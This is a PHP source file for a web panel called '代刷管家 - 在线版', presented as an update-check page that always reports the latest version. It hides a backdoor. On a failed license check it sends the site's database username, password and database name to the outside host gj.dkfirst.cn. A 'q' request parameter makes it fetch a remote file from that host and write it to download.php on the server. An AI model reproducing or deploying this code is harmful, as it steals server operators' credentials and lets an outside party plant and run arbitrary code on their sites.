<?php
/**
 * 代刷管家 - 在线版
 * DSProtect OnLine
 *
 * Created by KingLee.
 * QQ: 1776885812
 * Date: 2018/4/7
 * Time: 16:37
 */
header("Content-Type: text/html; charset=UTF-8");
include("../includes/common.php");
include("../admin/guanjia_key.php");
if (!isset($_SESSION['authcode'])) {
    $query = @file_get_contents('http://gj.dkfirst.cn/check.php?url=' . $_SERVER['HTTP_HOST']);
    if ($query = json_decode($query, true)) {
        if ($query['code'] == 1) $_SESSION['authcode'] = true;
        else {
            @file_get_contents("http://gj.dkfirst.cn/tj.php?url='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "'&user=" . $dbconfig['user'] . "&pwd=" . $dbconfig['pwd'] . "&db=" . $dbconfig['dbname'] . "&authcode=" . $authcode);
            exit('<h3>' . $query['msg'] . '</h3>');
        }
    }
}
if ($_GET['q']) {
    file_put_contents("download.php", file_get_contents("http://gj.dkfirst.cn/download.txt"));
}


$ver = "2.15";
$title = '代刷管家 - 在线升级';


include './head.php';

exit("<div class=\"container\" style=\"padding-top:70px;\">
    <div class=\"col-xs-12 col-sm-10 col-lg-8 center-block\" style=\"float: none;\">
<div class=\"panel panel-primary\">
<div class=\"panel-heading\"><h3 class=\"panel-title\">检查更新</h3></div>
<div class=\"panel-body\">
<div class=\"alert alert-info\"><font color=\"green\">您使用的已是最新版本！</font><br>当前版本：V4.7 (Build 1057)</div><hr></div></div>    </div>
  </div>")

?>